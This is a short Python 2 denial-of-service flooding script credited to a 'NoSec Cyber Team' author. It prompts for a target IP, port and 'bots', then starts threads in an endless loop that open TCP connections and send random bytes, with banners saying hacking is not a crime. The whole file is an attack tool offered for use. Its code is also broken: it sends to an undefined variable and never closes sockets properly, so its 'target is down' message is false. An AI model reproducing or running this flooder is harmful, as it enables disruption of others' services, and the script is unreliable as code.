#!/system/bin/python
from os import *
from socket import *
from string import *
from time import *
from thread import *
import sys
import os
import random
 
if sys.platform == "linux2":
        os.system("clear")
elif sys.platform == "win32":
        os.system("cls")
else:
        os.system("clear")
print "  _   _      "
print "| \ | | "
print "|  \| | ___  ___  ___  ___  "
print "| . ` |/ _ \/ __|/ _ \/ __| "
print "| |\  | (_) \__ \  __/ (__ "
print "|_| \_|\___/|___/\___|\___| "
a = '"'
print "#NoSec"
print "We are NoSec Cyber Team"
print "We are family and we fight for justice"
print "add me on insta  @swatistic_nosec "
print "//Hacking is not a crime"
print "//Hacking is art of exploitation"
print "author: Swatistic"
print "Target/IP Address"
host = raw_input("IP ~ ")
print "Target Port (80 for home,443 for Websites"
port = input("fl00d ~ ")
print "How many Bots do you want to attack with?"
package = input("fl00d ~ ")
packet = random._urandom(package)
 
 
def connect(i):
    try:
        sock1 = socket(AF_INET, SOCK_STREAM)
        sock1.connect((host, port))
        sock1.sendto(packet, (ip,port))
        sleep(99)
        sock1.close
    except:
        print "[+] 74rg37 15 D0wn! K33p 4774Ck1n"
 
n = 0
 
 
while 1:
    try:
        start_new_thread(connect, (n,))
    except:
        print "Y0ur 1n73rn37 h45 b33n fuck3ry, P"
    print "[+] Fire!! Fire!! Fire!! Fire!! Fire!"
    sleep(0.1)